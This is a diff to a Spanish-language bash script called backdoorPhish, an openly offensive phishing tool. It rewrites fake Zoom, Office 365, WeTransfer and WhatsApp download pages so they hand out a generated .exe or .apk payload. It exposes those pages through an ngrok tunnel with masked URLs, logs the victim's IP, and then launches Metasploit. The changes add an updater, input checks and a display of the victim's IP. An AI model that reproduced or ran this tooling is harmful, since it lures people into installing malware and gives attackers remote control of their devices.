@@ -68,6 +68,7 @@ On_White='\033[47m'     # White
 
 trap ctrl_c INT
 readonly BY='By @m4lal0'
+VERSION=1.0.1
 
 function stopServices() {
     CHECKNGROK=$(ps aux | grep -o "ngrok" | head -n1)
@@ -104,15 +105,15 @@ function banner(){
     echo -e "\t   | _ )   \/ __| |/ /   \ / _ \ / _ \| _ \ _ \ || |_ _| __| || |"
     echo -e "\t   | _ \ - | (__|   <| |) | (_) | (_) |   /  _/ __ || |\__ \ __ |${IPurple} $BY${Color_Off}"
     echo -e "\t${BRed}   |___/_|_|\___|_|\_\___/ \___/ \___/|_|_\_| |_||_|___|___/_||_|${Color_Off}"
-    echo -e "\t${On_Red}${BWhite}[!!] Atacar objetivos sin consentimiento mutuo previo es ILEGAL [!!]"
-    echo -e "\t[!!] El desarrollador no es responsables de ningún daño causado [!!]"
-    echo -e "\t[!!] por este script.                                           [!!]${Color_Off}\n"
+    echo -e "\t${On_Red}${BWhite}[!!] Atacar objetivos sin consentimiento mutuo previo es ILEGAL [!!]${Color_Off}"
+    echo -e "\t${On_Red}${BWhite}[!!] El desarrollador no es responsables de ningún daño causado [!!]${Color_Off}"
+    echo -e "\t${On_Red}${BWhite}[!!] por este script.                                           [!!]${Color_Off}\n"
 }
 
 function dependencies(){
     tput civis; clear; banner
-    dependencies=(php unzip curl wget keytool jarsigner)
-    echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BYellow}Comprobando herramientas necesarias...${Color_Off}\n"
+    dependencies=(php unzip curl wget keytool jarsigner jq)
+    echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BYellow}Comprobando herramientas necesarias:${Color_Off}\n"
     for program in "${dependencies[@]}"; do
         echo -ne "${LBlue}[${BBlue}*${LBlue}] ${BWhite}Herramienta $program...${Color_Off}"
         command -v $program > /dev/null 2>&1
@@ -120,8 +121,15 @@ function dependencies(){
             echo -e "${LBlue}($BGreen✔${LBlue})${Color_Off}"
         else
             echo -e "${LBlue}(${BRed}✘${LBlue})${Color_Off}"
-            echo -e "${LBlue}[${BYellow}!${LBlue}] ${BYellow}Instalando ${IYellow}$program...${Color_Off}"
+            echo -ne "${LBlue}[${BYellow}!${LBlue}] ${BYellow}Instalando ${IYellow}$program...${Color_Off}"
             apt-get install $program -y > /dev/null 2>&1
+            if [ $? -ne 0 ]; then 
+                echo -e "${LCyan}(${Bred}✘${LCyan})${Color_Off}"
+                echo -e "${IRed}Error al instalar $program...${Color_off}\n"
+                exit 1
+            else
+                echo -e "${LCyan}(${BGreen}✔${LCyan})${Color_Off}"
+            fi
         fi; sleep 1
     done
     if [[ ! -e ngrok ]]; then
@@ -140,14 +148,17 @@ function dependencies(){
     else
         echo -e "${LBlue}[${BBlue}*${LBlue}] ${BWhite}Herramienta ngrok...${LBlue}($BGreen✔${LBlue})${Color_Off}"
     fi
-    if [[ -e ip.txt ]]; then
-        rm -rf ip.txt
+    if [[ -e logs/ip.txt ]]; then
+        rm -rf logs/ip.txt 2>/dev/null
     fi
-    if [[ -e iptracker.log ]]; then
-        rm -rf iptracker.log
+    if [[ -e logs/info.json ]]; then
+        rm -rf logs/info.json 2>/dev/null
     fi
-    if [[ -e *.exe ]]; then
-        rm -rf *.exe
+    if [[ ! -e *.exe ]]; then
+        rm -rf *.exe 2>/dev/null
+    fi
+    if [[ ! -e *.apk ]]; then
+        rm -rf *.apk 2>/dev/null
     fi
     if [[ ! -e templates/zoom.html ]]; then
         echo -e "\n${LBlue}[${BRed}✘${LBlue}] ${BRed}No existe plantilla Zoom${Color_Off}"
@@ -170,6 +181,44 @@ function dependencies(){
         tput cnorm; exit 1
     fi
     sleep 3
+}
+
+function checkUpdate(){
+    GIT=$(curl --silent https://github.com/m4lal0/backdoorPhish/blob/main/backdoorPhish.sh | grep 'VERSION=' | cut -d">" -f2 | cut -d"<" -f1 | cut -d"=" -f 2)
+    if [[ "$GIT" == "$VERSION" || -z $GIT ]]; then
+        echo -e "${BGreen}[✔]${Color_Off} ${BGreen}La versión actual es la más reciente.${Color_Off}\n"
+        tput cnorm; exit 0
+    else
+        echo -e "${Yellow}[*]${Color_Off} ${IWhite}Actualización disponible${Color_Off}"
+        echo -e "${Yellow}[*]${Color_Off} ${IWhite}Actualización de la versión${Color_Off} ${BWhite}$VERSION${Color_Off} ${IWhite}a la${Color_Off} ${BWhite}$GIT${Color_Off}"
+        update="1"
+    fi
+}
+
+function installUpdate(){
+    echo -en "${Yellow}[*]${Color_Off} ${IWhite}Instalando actualización...${Color_Off}"
+    git clone https://github.com/m4lal0/backdoorPhish &>/dev/null
+    chmod +x backdoorPhish/backdoorPhish.sh && mv backdoorPhish/templates/* templates &>/dev/null
+    mv backdoorPhish/backdoorPhish.sh . &>/dev/null
+    mv backdoorPhish/get_ip.php . &>/dev/null
+    mv backdoorPhish/info.php . &>/dev/null
+    if [ "$(echo $?)" == "0" ]; then
+        echo -e "${BGreen}[ OK ]${Color_Off}"
+    else
+        echo -e "${BRed}[ FAIL ]${Color_Off}"
+        tput cnorm && exit 1
+    fi
+    echo -en "${Yellow}[*]${Color_Off} ${IWhite}Limpiando...${Color_Off}"
+    wait
+    rm -rf backdoorPhish &>/dev/null
+    if [ "$(echo $?)" == "0" ]; then
+        echo -e "${BGreen}[ OK ]${Color_Off}"
+    else
+        echo -e "${BRed}[ FAIL ]${Color_Off}"
+        tput cnorm && exit 1
+    fi
+    echo -e "\n${BGreen}[✔]${Color_Off} ${IGreen}Versión actualizada a${Color_Off} ${BWhite}$GIT${Color_Off}\n"
+    tput cnorm && exit 0
 }
 
 function startServices(){
@@ -197,7 +246,8 @@ function startServices(){
         exit 1
     fi
 
-    URL=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+    #URL=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+    URL=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq | grep "public_url" | head -n 1 | awk '{print $2}' | grep -oP '\".*?\"' | tr -d '"')
 }
 
 function crypted(){
@@ -282,6 +332,11 @@ function templates(){
     echo -en "${BRed}└──╼${BGreen} " && read OPTION_TEMPLATE
     echo -e "${Color_Off}"
 
+    case $OPTION_TEMPLATE in
+        1|2|3|4) ;;
+        *) config;;
+    esac
+
     payload
     startServices
 
@@ -293,10 +348,10 @@ function templates(){
         WORDS="support-download"
         URLMASK=$MASK-$WORDS@$SHORTER
         if [[ $OPTION_OS -eq 1 ]]; then
-            sed 's+https://zoom.us/client/latest/ZoomInstaller.exe+'$URL/$PAYLOAD_NAME.exe'+g' templates/zoom.html > index2.html
+            sed 's+forwarding_file+'$PAYLOAD_NAME.exe'+g' templates/zoom.html > index2.html
         fi
         if [[ $OPTION_OS -eq 2 ]]; then
-            sed 's+https://zoom.us/client/latest/ZoomInstaller.exe+'$URL/$PAYLOAD_NAME.apk'+g' templates/zoom.html > index2.html
+            sed 's+forwarding_file+'$PAYLOAD_NAME.apk'+g' templates/zoom.html > index2.html
         fi
     fi
     if [[ $OPTION_TEMPLATE -eq 2 ]]; then
@@ -306,10 +361,10 @@ function templates(){
         WORDS="es-mx-microsoft-365"
         URLMASK=$MASK-$WORDS@$SHORTER
         if [[ $OPTION_OS -eq 1 ]]; then
-            sed 's+forwarding_link+'$URL/$PAYLOAD_NAME.exe'+g' templates/office.html > index2.html
+            sed 's+forwarding_file+'$PAYLOAD_NAME.exe'+g' templates/office.html > index2.html
         fi
         if [[ $OPTION_OS -eq 2 ]]; then
-            sed 's+forwarding_link+'$URL/$PAYLOAD_NAME.apk'+g' templates/office.html > index2.html
+            sed 's+forwarding_file+'$PAYLOAD_NAME.apk'+g' templates/office.html > index2.html
         fi
     fi
     if [[ $OPTION_TEMPLATE -eq 3 ]]; then
@@ -319,10 +374,10 @@ function templates(){
         WORDS="file"
         URLMASK=$MASK-$WORDS@$SHORTER
         if [[ $OPTION_OS -eq 1 ]]; then
-            sed 's+forwarding_link+'$URL/$PAYLOAD_NAME.exe'+g' templates/wetransfer.html > index2.html
+            sed 's+forwarding_file+'$PAYLOAD_NAME.exe'+g' templates/wetransfer.html > index2.html
         fi
         if [[ $OPTION_OS -eq 2 ]]; then
-            sed 's+forwarding_link+'$URL/$PAYLOAD_NAME.apk'+g' templates/wetransfer.html > index2.html
+            sed 's+forwarding_file+'$PAYLOAD_NAME.apk'+g' templates/wetransfer.html > index2.html
         fi
     fi
     if [[ $OPTION_TEMPLATE -eq 4 ]]; then
@@ -332,10 +387,14 @@ function templates(){
         WORDS="download"
         URLMASK=$MASK-$WORDS@$SHORTER
         if [[ $OPTION_OS -eq 1 ]]; then
-            sed 's+forwarding_link+'$URL/$PAYLOAD_NAME.exe'+g' templates/whatsapp.html > index2.html
+            sed 's+forwarding_file+'$PAYLOAD_NAME.exe'+g' templates/whatsapp.html > index.html
+            sed 's+forwarding_link+'$URL/$PAYLOAD_NAME.exe'+g' index.html > index2.html
+            rm -rf index.html 2>/dev/null
         fi
         if [[ $OPTION_OS -eq 2 ]]; then
-            sed 's+forwarding_link+'$URL/$PAYLOAD_NAME.apk'+g' templates/whatsapp.html > index2.html
+            sed 's+forwarding_file+'$PAYLOAD_NAME.apk'+g' templates/whatsapp.html > index.html
+            sed 's+forwarding_link+'$URL/$PAYLOAD_NAME.apk'+g' index.html > index2.html
+            rm -rf index.html 2>/dev/null
         fi
     fi
 
@@ -343,8 +402,10 @@ function templates(){
 
     echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BYellow}Espere a que el objetivo entre a la URL, presione ${Color_Off}${Blink}Ctrl + C${Color_Off} ${BYellow}para salir...${Color_Off}\n"
     while [ true ]; do
-		if [[ -e "ip.txt" ]]; then
+		if [[ -e "logs/ip.txt" ]]; then
             echo -e "\n${BGreen}[+] El objetivo entró a la URL! ${Color_Off}\n"
+            echo -e "${IWhite}IP de la victima:${Color_Off} ${BWhite}$(head -n1 logs/ip.txt | awk '{print $2}')${Color_Off}"
+            echo -e "${IWhite}Se guarda el resultado en el directorio:${Color_Off} ${BWhite}logs${Color_Off}\n"
             tput cnorm; startMsf
 		fi
 	    sleep 0.5
@@ -364,10 +425,34 @@ function config(){
     echo -e "\n${BRed}┌─[${BWhite}Elegir el Sistema Operativo del objetivo (1/2)${BRed}]${Color_Off}"
     echo -en "${BRed}└──╼${BGreen} " && read OPTION_OS
     echo -e "${Color_Off}"
-
-    templates
+    # templates
+    case $OPTION_OS in
+        1|2) templates;;
+        *) config;;
+    esac
 }
 
 checkRoot
-dependencies
-config
+if [ "$(echo $1)" == "--update" ]; then
+    clear; banner
+    echo -e "${BBlue}[+]${Color_Off} ${BWhite}backdoorPhish Versión $VERSION${Color_Off}"
+    echo -e "${BBlue}[+]${Color_Off} ${BWhite}Verificando actualización de backdoorPhish${Color_Off}"
+    checkUpdate
+    echo -e "\t${BWhite}$VERSION ${IWhite}Versión Instalada${Color_Off}"
+    echo -e "\t${BWhite}$GIT ${IWhite}Versión en Git${Color_Off}\n"
+    if [ "$update" != "1" ]; then
+        tput cnorm && exit 0;
+    else
+        echo -e "${BBlue}[+]${Color_Off} ${BWhite}Necesita actualizar!${Color_Off}"
+        tput cnorm
+        echo -en "${BPurple}[?]${Color_Off} ${BCyan}Quiere actualizar? (${BGreen}Y${BCyan}/${BRed}n${BCyan}):${Color_Off} " && read CONDITION
+        tput civis
+        case "$CONDITION" in
+            n|N) echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BRed}No se actualizo, se queda en la versión ${BWhite}$VERSION${Color_Off}\n" && tput cnorm && exit 0;;
+            *) installUpdate;;
+        esac
+    fi
+else
+    dependencies
+    config
+fi
